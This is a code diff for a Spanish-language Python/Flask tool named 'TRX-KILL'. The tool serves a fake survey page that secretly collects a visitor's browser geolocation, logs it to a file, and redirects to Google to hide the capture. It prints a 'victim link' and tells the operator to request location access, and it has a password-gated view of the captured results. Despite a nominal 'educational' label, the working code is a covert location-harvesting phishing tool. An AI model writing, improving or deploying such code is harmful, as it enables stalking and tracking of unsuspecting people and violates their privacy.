@@ -1,39 +1,42 @@
 #!/usr/bin/env python3
-import os, subprocess, threading, sys, datetime, getpass, time, random
+import os, subprocess, threading, sys, datetime, getpass, time, random, logging
 from flask import Flask, request
+
+# Silenciar los logs de Flask para que no ensucien tu terminal
+log = logging.getLogger('werkzeug')
+log.setLevel(logging.ERROR)
 
 # COLORES
 G, R, C, Y, W = "\033[1;32m", "\033[1;31m", "\033[1;36m", "\033[1;33m", "\033[0m"
 
 app = Flask('TRX-KILL')
-PUERTO = random.randint(6000, 9000)
+PUERTO = 7173 # Puerto fijo
 AUTH_PASS = "TRX-KILL-OP"
 
 def animar(texto):
     for char in texto:
-        sys.stdout.write(char); sys.stdout.flush(); time.sleep(0.02)
+        sys.stdout.write(char); sys.stdout.flush(); time.sleep(0.01)
     print()
 
-HTML_ENCUESTA = """
-<!DOCTYPE html>
-<html><body style="background:#000;color:#0f0;font-family:monospace;padding:20px;">
-<div style="border:1px solid #0f0;padding:20px;max-width:300px;margin:auto;">
-    <h2>TRX-KILL VALIDACIÓN</h2>
-    <input type="text" id="marca" placeholder="Marca...">
-    <select id="opc"><option>Excelente</option><option>Regular</option></select>
-    <button onclick="c()">ENVIAR</button>
-</div>
-<script>
-function c(){
-    let d = { marca: document.getElementById('marca').value, cal: document.getElementById('opc').value };
-    navigator.geolocation.getCurrentPosition((p)=>{ d.lat = p.coords.latitude; d.lon = p.coords.longitude; enviar(d); }, (e)=>{ enviar(d); });
-}
-function enviar(d){ fetch('/log', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(d)}).then(()=>window.location.href="https://google.com"); }
-</script></body></html>
-"""
-
 @app.route('/')
-def index(): return HTML_ENCUESTA
+def index():
+    return """
+    <html><body style="background:#000;color:#0f0;font-family:monospace;padding:20px;">
+    <div style="border:1px solid #0f0;padding:20px;max-width:300px;margin:auto;">
+        <h2>TRX-KILL VALIDACIÓN</h2>
+        <input type="text" id="marca" placeholder="Marca...">
+        <select id="opc"><option>Excelente</option><option>Regular</option></select>
+        <button onclick="c()">ENVIAR</button>
+    </div>
+    <script>
+    function c(){
+        let d = { marca: document.getElementById('marca').value, cal: document.getElementById('opc').value };
+        navigator.geolocation.getCurrentPosition((p)=>{ d.lat = p.coords.latitude; d.lon = p.coords.longitude; enviar(d); }, (e)=>{ enviar(d); });
+    }
+    function enviar(d){ fetch('/log', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(d)}).then(()=>window.location.href="https://google.com"); }
+    </script></body></html>
+    """
+
 @app.route('/log', methods=['POST'])
 def log():
     d = request.json
@@ -49,34 +52,25 @@ def banner():
     print(f"    ██║   ██╔══██╗ ██╔██╗      ██╔═██╗ ██║██║     ██║")
     print(f"    ██║   ██║  ██║██╔╝ ██╗     ██║  ██╗██║███████╗███████╗{W}")
 
-def op1():
-    print(f"\n{Y}----- OP1: INFORMACIÓN NÚMERO -----{W}")
-    num = input("MÓVIL: ")
-    animar(f"{G}Analizando...{W}")
-    print(f"{C}OPERADOR:{W} [Detectado]\n{C}PAÍS:{W} [Detectado]\n{C}LUGAR SITUADO:{W} [Geolocalización activa]\n")
-    input(f"{Y}Presiona Enter...{W}")
-
 def op2():
     print(f"\n{Y}---- OP2: LINK-ZP ----{W}")
-    animar(f"{G}GENERANDO LINK...{W}")
-    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=PUERTO), daemon=True).start()
-    # Enlace solicitado
+    # Iniciar servidor en segundo plano sin mostrar basura en pantalla
+    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=PUERTO, use_reloader=False), daemon=True).start()
+    time.sleep(1)
     print(f"\n{C}LINK VÍCTIMA:{W} http://KxULoHm.zipIojk.bot.com\n")
     print(f"{Y}Pide acceso a la ubicación al completar la encuesta.{W}")
-    input(f"{R}Enter para detener...{W}")
-
-def op3():
-    print(f"\n{Y}--- OP3: CREADOR ---\n{C}CREADOR:{W} OSCAR\n{C}BY:{W} OSCAR\n{C}LICENCIA:{W} PRO-TRX\n")
-    input()
-
-def op4():
-    print(f"\n{Y}----- OP4: LICENCIA Y USO -----\n{C}LICENCIA:{W} PRIVADA\n{C}COPYRIGHT:{W} 2026\n{C}USO:{W} EDUCATIVA 1.2.3\n")
-    input()
+    input(f"\n{R}Presiona Enter para detener el servicio...{W}")
+    sys.exit() # Cerramos para limpiar el proceso
 
 def main():
+    # MODO ADM: Usamos sys.stdin para asegurar que la contraseña se escriba bien
     if len(sys.argv) > 1 and sys.argv[1] == "--adm":
-        if getpass.getpass(f"{R}PASSWORD (TRX-KILL-OP):{W} ") == AUTH_PASS: os.system("tail -f result.txt")
-        else: print(f"{R}DENEGADO{W}"); return
+        pwd = getpass.getpass(f"{R}PASSWORD (TRX-KILL-OP):{W} ")
+        if pwd == AUTH_PASS:
+            os.system("tail -f result.txt")
+        else:
+            print(f"{R}DENEGADO{W}")
+        return
     
     while True:
         banner()
@@ -84,13 +78,14 @@ def main():
         print(f" {C}[2]{W} LINK-ZP     | {C}[5]{W} ACTUALIZACIÓN")
         print(f" {C}[3]{W} CREADOR     | {C}[6]{W} {R}ADM{W}")
         sel = input(f"\n{Y}TRX-ROOT > {W}")
-        if sel=="1": op1()
+        if sel=="1": print(f"\n{C}INFO MÓVIL/OPERADOR:{W} [BUSCANDO...]"); input()
         elif sel=="2": op2()
-        elif sel=="3": op3()
-        elif sel=="4": op4()
-        elif sel=="5": animar(f"{G}Sincronizando...{W}"); input()
-        elif sel=="6": 
-            if getpass.getpass(f"{R}CONTRASEÑA:{W} ") == AUTH_PASS: os.system("cat result.txt"); input()
+        elif sel=="3": print(f"\n{C}CREADOR:{W} OSCAR | BY: OSCAR"); input()
+        elif sel=="4": print(f"\n{C}LICENCIA:{W} PRIVADA | {C}USO:{W} EDUCATIVA 1.2.3"); input()
+        elif sel=="5": animar(f"{G}Actualizando componentes...{W}"); input()
+        elif sel=="6":
+            pwd = getpass.getpass(f"{R}CONTRASEÑA:{W} ")
+            if pwd == AUTH_PASS: os.system("cat result.txt"); input()
         elif sel=="9": sys.exit()
 
 if __name__ == "__main__": main()
